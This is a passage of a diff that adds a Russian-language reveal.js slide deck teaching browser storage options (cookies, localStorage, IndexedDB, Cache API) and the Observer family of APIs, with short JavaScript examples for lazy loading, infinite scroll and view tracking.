+                        <li class="fragment">При нехватке места браузер удаляет данные <strong>редко
+                                используемых</strong> сайтов</li>
+                        <li class="fragment"><code>navigator.storage.persist()</code> - попросить не удалять. Браузер
+                            показывает запрос</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Применения</h2>
+                    <ul>
+                        <li class="fragment">PWA - кэш ассетов и API-ответов вместе с Service Worker</li>
+                        <li class="fragment">Оффлайн-заметки, чек-листы, todo</li>
+                        <li class="fragment">Веб-мессенджер - история сообщений</li>
+                        <li class="fragment">Большой клиентский кэш для аналитических дашбордов</li>
+                        <li class="fragment">Локальный поиск по справочнику</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 5: СРАВНЕНИЕ ===== -->
+            <section>
+                <section>
+                    <h1>Что выбрать</h1>
+                </section>
+
+                <section>
+                    <h2>Сравнение</h2>
+                    <table style="font-size: 0.5em; width: 100%; margin-top: 0.5em;">
+                        <thead>
+                            <tr style="background: rgba(255, 213, 79, 0.12); color: #ffd54f;">
+                                <th style="padding: 0.4em 0.6em; text-align: left;"></th>
+                                <th style="padding: 0.4em 0.6em;">Cookies</th>
+                                <th style="padding: 0.4em 0.6em;">localStorage</th>
+                                <th style="padding: 0.4em 0.6em;">sessionStorage</th>
+                                <th style="padding: 0.4em 0.6em;">IndexedDB</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr class="fragment">
+                                <td style="padding: 0.3em 0.6em;"><strong>Размер</strong></td>
+                                <td style="padding: 0.3em 0.6em;">~4 KB</td>
+                                <td style="padding: 0.3em 0.6em;">~5-10 MB</td>
+                                <td style="padding: 0.3em 0.6em;">~5-10 MB</td>
+                                <td style="padding: 0.3em 0.6em;">сотни MB</td>
+                            </tr>
+                            <tr class="fragment">
+                                <td style="padding: 0.3em 0.6em;"><strong>API</strong></td>
+                                <td style="padding: 0.3em 0.6em;">sync, строка</td>
+                                <td style="padding: 0.3em 0.6em;">sync, key-value</td>
+                                <td style="padding: 0.3em 0.6em;">sync, key-value</td>
+                                <td style="padding: 0.3em 0.6em;">async, объекты</td>
+                            </tr>
+                            <tr class="fragment">
+                                <td style="padding: 0.3em 0.6em;"><strong>Жизнь</strong></td>
+                                <td style="padding: 0.3em 0.6em;"><code>Expires</code></td>
+                                <td style="padding: 0.3em 0.6em;">пока не удалят</td>
+                                <td style="padding: 0.3em 0.6em;">вкладка</td>
+                                <td style="padding: 0.3em 0.6em;">пока не удалят</td>
+                            </tr>
+                            <tr class="fragment">
+                                <td style="padding: 0.3em 0.6em;"><strong>Уходит на сервер</strong></td>
+                                <td style="padding: 0.3em 0.6em;">да, авто</td>
+                                <td style="padding: 0.3em 0.6em;">нет</td>
+                                <td style="padding: 0.3em 0.6em;">нет</td>
+                                <td style="padding: 0.3em 0.6em;">нет</td>
+                            </tr>
+                            <tr class="fragment">
+                                <td style="padding: 0.3em 0.6em;"><strong>Виден из JS</strong></td>
+                                <td style="padding: 0.3em 0.6em;">если не <code>HttpOnly</code></td>
+                                <td style="padding: 0.3em 0.6em;">да</td>
+                                <td style="padding: 0.3em 0.6em;">да</td>
+                                <td style="padding: 0.3em 0.6em;">да</td>
+                            </tr>
+                            <tr class="fragment">
+                                <td style="padding: 0.3em 0.6em;"><strong>Структура</strong></td>
+                                <td style="padding: 0.3em 0.6em;">плоский список</td>
+                                <td style="padding: 0.3em 0.6em;">плоский</td>
+                                <td style="padding: 0.3em 0.6em;">плоский</td>
+                                <td style="padding: 0.3em 0.6em;">stores + индексы</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <section>
+                    <h2>Cache API - кратко</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Хранилище <strong>HTTP-ответов</strong>, не произвольных данных. Используется в Service Worker
+                        для PWA
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>const cache = await caches.open('v1');
+
+await cache.add('/api/products');             // скачать и положить
+await cache.put('/data', new Response('...'));// положить руками
+
+const cached = await cache.match('/api/products');
+if (cached) return cached;                    // отдать из кэша
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Дерево решений</h2>
+                    <ul>
+                        <li class="fragment">Нужно серверу - <strong>cookie</strong></li>
+                        <li class="fragment">Только клиенту, до закрытия вкладки - <strong>sessionStorage</strong></li>
+                        <li class="fragment">Только клиенту, надолго, мало данных - <strong>localStorage</strong></li>
+                        <li class="fragment">Много данных, поиск по полям, оффлайн - <strong>IndexedDB</strong></li>
+                        <li class="fragment">Кэш HTTP-ответов в Service Worker - <strong>Cache API</strong></li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 6: OBSERVER PATTERN ===== -->
+            <section>
+                <section>
+                    <h1>Observer APIs</h1>
+                </section>
+
+                <section>
+                    <h2>Паттерн Observer</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Подписаться на изменения объекта - получать колбэк, когда что-то меняется
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        В браузере по этому паттерну сделано целое семейство API - <code>IntersectionObserver</code>,
+                        <code>ResizeObserver</code>, <code>MutationObserver</code>, <code>PerformanceObserver</code>...
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Зачем понадобились</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// Старый способ - слушать scroll и считать руками
+window.addEventListener('scroll', () => {
+    const rect = el.getBoundingClientRect();    // forced layout
+    if (rect.top &lt; window.innerHeight) {
+        // элемент в зоне видимости
+    }
+});
+</code></pre>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><code>scroll</code> летит десятки раз в секунду - перегружает поток</li>
+                        <li class="fragment"><code>getBoundingClientRect</code> вызывает <strong>forced layout</strong>
+                        </li>
+                        <li class="fragment">Дёргается при каждом скролле, даже когда ничего не изменилось</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Как сделали observer'ы</h2>
+                    <ul>
+                        <li class="fragment">Колбэк вызывается <strong>не на каждое движение</strong>, а когда условие
+                            реально сработало</li>
+                        <li class="fragment">Браузер сам решает, когда удобно посчитать - не блокирует основной поток
+                        </li>
+                        <li class="fragment">Несколько изменений батчатся в один callback</li>
+                        <li class="fragment">Меньше кода - не надо считать пересечения и размеры руками</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Общий API</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const observer = new XxxObserver((entries) => {
+    for (const entry of entries) {
+        // entry - что изменилось
+    }
+});
+
+observer.observe(target, options);   // начать следить
+observer.unobserve(target);          // перестать следить за target
+observer.disconnect();               // отключить вообще
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Все четыре observer'а в браузере выглядят одинаково - выучил один, узнал остальные
+                    </p>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 7: INTERSECTION OBSERVER ===== -->
+            <section>
+                <section>
+                    <h1 style="font-size: 2.8em;">IntersectionObserver</h1>
+                </section>
+
+                <section>
+                    <h2>Задача</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Узнавать, когда элемент <strong>пересекается</strong> с вьюпортом (или другим контейнером)
+                    </p>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment">Lazy load изображений - подгружать перед появлением</li>
+                        <li class="fragment">Бесконечная прокрутка - подгружать страницу N+1</li>
+                        <li class="fragment">Аналитика просмотров - элемент был на экране?</li>
+                        <li class="fragment">Sticky-эффекты, появление по скроллу</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Базовое использование</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const observer = new IntersectionObserver((entries) => {
+    for (const entry of entries) {
+        if (entry.isIntersecting) {
+            console.log(entry.target, 'появился во вьюпорте');
+        }
+    }
+});
+
+observer.observe(document.querySelector('#hero'));
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Опции</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>new IntersectionObserver(callback, {
+    root: null,                  // null = вьюпорт; иначе - элемент-контейнер
+    rootMargin: '0px 0px 200px', // расширить зону видимости (как margin)
+    threshold: [0, 0.5, 1],      // на каких долях пересечения дёргать callback
+});
+</code></pre>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><code>rootMargin: '200px'</code> - сработает за 200px <strong>до</strong>
+                            попадания во вьюпорт</li>
+                        <li class="fragment"><code>threshold: 0.5</code> - срабатывает, когда видна половина элемента
+                        </li>
+                        <li class="fragment">Массив порогов - callback дёргается на каждом</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Что в entry</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>{
+    target: HTMLElement,        // сам элемент
+    isIntersecting: boolean,    // пересекается ли с root
+    intersectionRatio: 0.42,    // какая доля пересекается (0..1)
+    intersectionRect: DOMRect,  // прямоугольник пересечения
+    boundingClientRect: DOMRect,// рамка элемента
+    rootBounds: DOMRect,        // рамка root
+    time: 12345,                // performance.now() события
+}
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Lazy load изображений</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const io = new IntersectionObserver((entries, obs) => {
+    for (const entry of entries) {
+        if (!entry.isIntersecting) continue;
+        const img = entry.target;
+        img.src = img.dataset.src;
+        obs.unobserve(img);   // загрузили один раз - дальше не следим
+    }
+}, { rootMargin: '200px' });
+
+document.querySelectorAll('img[data-src]').forEach((img) => io.observe(img));
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        В современном HTML то же делает атрибут <code>loading="lazy"</code> - но только для картинок и
+                        iframe
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Бесконечная прокрутка</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// В конец списка добавляем "сторожевой" элемент
+&lt;ul&gt;
+    {posts.map(p =&gt; &lt;li key={p.id}&gt;...&lt;/li&gt;)}
+    &lt;li ref={sentinelRef} /&gt;
+&lt;/ul&gt;
+</code></pre>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>useEffect(() =&gt; {
+    const io = new IntersectionObserver(([entry]) =&gt; {
+        if (entry.isIntersecting) loadNextPage();
+    });
+    io.observe(sentinelRef.current);
+    return () =&gt; io.disconnect();
+}, []);
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Аналитика просмотров</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// "Считается просмотром, если 50% карточки было видно &gt; 1 секунды"
+const seen = new WeakSet();
+
+const io = new IntersectionObserver((entries) =&gt; {
+    for (const entry of entries) {
+        if (entry.intersectionRatio &gt;= 0.5 &amp;&amp; !seen.has(entry.target)) {
+            const id = setTimeout(() =&gt; {
+                seen.add(entry.target);
+                track('card-viewed', entry.target.dataset.id);
+            }, 1000);
+            entry.target._timer = id;
+        } else {
+            clearTimeout(entry.target._timer);
+        }
+    }
+}, { threshold: 0.5 });
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Подводный камень</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Сразу после <code>observe(el)</code> callback приходит <strong>с начальным состоянием</strong> -
+                        даже если ничего не изменилось
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        Удобно (можно не звонить руками), но если ждали "только когда прокрутили" - можно удивиться, что
+                        трекер сработал на загрузке страницы
+                    </p>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 8: RESIZE OBSERVER ===== -->
+            <section>
+                <section>
+                    <h1>ResizeObserver</h1>
+                </section>
+
+                <section>
+                    <h2>Задача</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Реагировать на изменение <strong>размера элемента</strong> - не <code>window</code>, а
+                        конкретного блока
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        Раньше единственное событие - <code>window.resize</code>. Знать, что сайдбар стал шире из-за
+                        контента, было нечем
+                    </p>
+                </section>
+
+                <section>
+                    <h2>API</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const ro = new ResizeObserver((entries) =&gt; {
+    for (const entry of entries) {
+        const { width, height } = entry.contentRect;
+        console.log(entry.target, width, 'x', height);
+    }
+});
+
+ro.observe(el);                                  // дефолт - content-box
+ro.observe(el, { box: 'border-box' });           // вместе с padding и border
+ro.observe(el, { box: 'device-pixel-content-box' }); // в реальных пикселях устройства
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Что в entry</h2>
+                    <pre class="javascript size-m code-example-one fragment"><code>{
+    target: HTMLElement,
+    contentRect: DOMRectReadOnly,    // удобно, но deprecated
+    contentBoxSize:    [{ inlineSize, blockSize }],
+    borderBoxSize:     [{ inlineSize, blockSize }],
+    devicePixelContentBoxSize: [{ inlineSize, blockSize }],
+}
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        <code>inlineSize</code> и <code>blockSize</code> - размеры в логических осях (учитывают
+                        <code>writing-mode</code>)
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Применения</h2>
+                    <ul>
+                        <li class="fragment">Адаптивные компоненты - меняем layout, когда контейнер стал узким (до
+                            Container Queries)</li>
+                        <li class="fragment">Canvas - подгонять <code>width</code>/<code>height</code> атрибуты под
+                            фактический размер</li>
+                        <li class="fragment">Виртуализация списков - пересчитать видимые строки</li>
+                        <li class="fragment">Автоподгонка шрифта под ширину блока</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Container queries в JS</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const ro = new ResizeObserver(([entry]) =&gt; {
+    const w = entry.contentRect.width;
+    entry.target.classList.toggle('is-narrow',  w &lt; 400);
+    entry.target.classList.toggle('is-medium', w &gt;= 400 &amp;&amp; w &lt; 800);
+    entry.target.classList.toggle('is-wide',   w &gt;= 800);
+});
+
+ro.observe(card);
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Сегодня то же делает CSS <code>@container</code> - но <code>ResizeObserver</code> остаётся для
+                        логики, не только стилей
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Loop warning</h2>
+                    <pre class="bash size-l code-example-one fragment"><code>ResizeObserver loop completed with undelivered notifications.
+</code></pre>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        Внутри callback'а изменили размер наблюдаемого элемента - на следующем кадре он снова сработает
+                        - и так по кругу
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.4em;">
+                        Браузер обрывает цикл и кидает варнинг. Лечится откладыванием изменений в
+                        <code>requestAnimationFrame</code> и проверкой "размер реально другой?"
+                    </p>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 9: MUTATION OBSERVER ===== -->
+            <section>
+                <section>
+                    <h1>MutationObserver</h1>
+                </section>
+
+                <section>
+                    <h2>Задача</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Реагировать на <strong>изменения DOM</strong> - добавили узел, поменяли атрибут, изменили текст
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        Чужой код меняет страницу, а вам надо узнать - своих хуков нет, а событие нужно
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Что было до</h2>
+                    <ul>
+                        <li class="fragment"><strong>DOM Mutation Events</strong> - <code>DOMNodeInserted</code>,
+                            <code>DOMSubtreeModified</code>...</li>
+                        <li class="fragment">Синхронные - дёргались внутри изменения, при цепочках вешали страницу</li>
+                        <li class="fragment">Удалены из стандарта в 2012, заменены на <code>MutationObserver</code></li>
+                        <li class="fragment">Новый - асинхронный, батчит изменения, не блокирует мутации</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>API</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const mo = new MutationObserver((records) =&gt; {
+    for (const record of records) {
+        console.log(record.type);         // 'childList' | 'attributes' | 'characterData'
+        console.log(record.addedNodes);
+        console.log(record.removedNodes);
+    }
+});
+
+mo.observe(document.body, {
+    childList: true,        // следить за добавлением/удалением детей
+    attributes: true,       // изменения атрибутов
+    characterData: true,    // изменения текстовых нод
+    subtree: true,          // рекурсивно по всему поддереву
+    attributeOldValue: true,
+    attributeFilter: ['class', 'data-state'],  // только эти атрибуты
+});
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>MutationRecord</h2>
+                    <pre class="javascript size-m code-example-one fragment"><code>{
+    type: 'attributes',
+    target: HTMLElement,           // на ком сработало
+    attributeName: 'class',
+    oldValue: 'card',              // если попросили attributeOldValue
+    addedNodes: NodeList,          // для childList
+    removedNodes: NodeList,
+    previousSibling: Node | null,
+    nextSibling: Node | null,
+}
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Применения</h2>
+                    <ul>
+                        <li class="fragment">Интеграция с <strong>чужим</strong> виджетом - переопределить стили в чужой
+                            разметке</li>
+                        <li class="fragment">Расширения браузера - реагировать на динамически вставляемый контент сайта
+                        </li>
+                        <li class="fragment">Подсветка кода / автокомплит в чужом WYSIWYG</li>
+                        <li class="fragment">Отслеживание появления элемента - "когда модалка отрендерилась"</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Ждать появления элемента</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>function waitFor(selector, root = document) {
+    return new Promise((resolve) =&gt; {
+        const found = root.querySelector(selector);
+        if (found) return resolve(found);
+
+        const mo = new MutationObserver(() =&gt; {
+            const el = root.querySelector(selector);
+            if (el) {
+                mo.disconnect();
+                resolve(el);
+            }
+        });
+        mo.observe(root, { childList: true, subtree: true });
+    });
+}
+
+const modal = await waitFor('.modal');
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Производительность</h2>
+                    <ul>
+                        <li class="fragment"><code>subtree: true</code> на <code>document.body</code> - наблюдаем за
+                            всем</li>
+                        <li class="fragment">При активном UI callback дёргается часто - надо дёшево фильтровать в нём
+                        </li>
+                        <li class="fragment">Не используйте <code>MutationObserver</code> для своего React/Vue кода -
+                            там есть нормальные хуки</li>
+                        <li class="fragment">Это инструмент для <strong>интеграций с чужим кодом</strong>, не для
+                            повседневной разработки</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 10: ДРУГИЕ OBSERVER APIs ===== -->
+            <section>
+                <section>
+                    <h1>Остальные observer'ы</h1>
+                </section>
+
+                <section>
+                    <h2>PerformanceObserver</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Подписка на <strong>метрики производительности</strong> - LCP, CLS, INP, long tasks, ресурсы
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>new PerformanceObserver((list) =&gt; {
+    for (const entry of list.getEntries()) {
+        console.log(entry.name, entry.startTime, entry.duration);
+    }
+}).observe({ type: 'largest-contentful-paint', buffered: true });
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        <code>buffered: true</code> - получить события, которые случились ДО подписки. Удобно для метрик
+                        стартовой отрисовки
+                    </p>
+                </section>
+
+                <section>
+                    <h2>ReportingObserver</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Браузер хочет рассказать про deprecation, intervention, нарушения CSP - всё это летит сюда
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>new ReportingObserver((reports) =&gt; {
+    for (const r of reports) {
+        // r.type === 'deprecation' | 'intervention' | 'csp-violation'
+        sendToAnalytics(r.type, r.body);
+    }
+}, { buffered: true }).observe();
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Узнаёте об устаревших API раньше пользователей - до того, как Chrome их выпилит
+                    </p>
+                </section>
+            </section>
+
+            <!-- ===== ИТОГ ===== -->
+            <section>
+                <section>
+                    <h1>Итог</h1>
+                </section>
+
+                <section>
+                    <h2>Хранилища</h2>
+                    <div class="timeline">
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Cookies</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Сессии и аутентификация. Всегда
+                                <code>HttpOnly + Secure + SameSite</code></div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">localStorage</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Настройки UI и черновики. Не для секретов</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">sessionStorage</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Временные данные на одну вкладку</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">IndexedDB</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Большие объёмы и оффлайн. Через <code>idb</code> или Dexie</div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Observer'ы</h2>
+                    <div class="timeline">
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Intersection</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Lazy load, infinite scroll, аналитика просмотров</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Resize</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Размер элемента, container-aware компоненты</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Mutation</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Изменения DOM. Для интеграции с чужим кодом, не для своего</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Performance</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Web Vitals и собственные метрики</div>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="/utils/lib/js/head.min.js"></script>
+    <script src="/utils/js/reveal.js"></script>
+    <script src="https://yastatic.net/jquery/2.1.4/jquery.min.js"></script>
+    <script src="/utils/lib/js/code-example.js"></script>
+    <script>
+        Reveal.initialize({
+            controls: false, progress: true, history: true, center: false,
+            transition: 'slide',
+            dependencies: [
+                { src: '/utils/lib/js/classList.js', condition: function () { return !document.body.classList; } },
+                { src: '/utils/plugin/markdown/marked.js', condition: function () { return !!document.querySelector('[data-markdown]'); } },
+                { src: '/utils/plugin/markdown/markdown.js', condition: function () { return !!document.querySelector('[data-markdown]'); } },
+                { src: '/utils/plugin/highlight/highlight.js', async: true, condition: function () { return !!document.querySelector('pre code'); }, callback: function () { hljs.initHighlightingOnLoad(); } },
+                { src: '/utils/plugin/zoom-js/zoom.js', async: true },
+                { src: '/utils/plugin/notes/notes.js', async: true }
+            ]
+        });
+        Reveal.configure({ slideNumber: true });
+    </script>
+</body>
+
+</html>
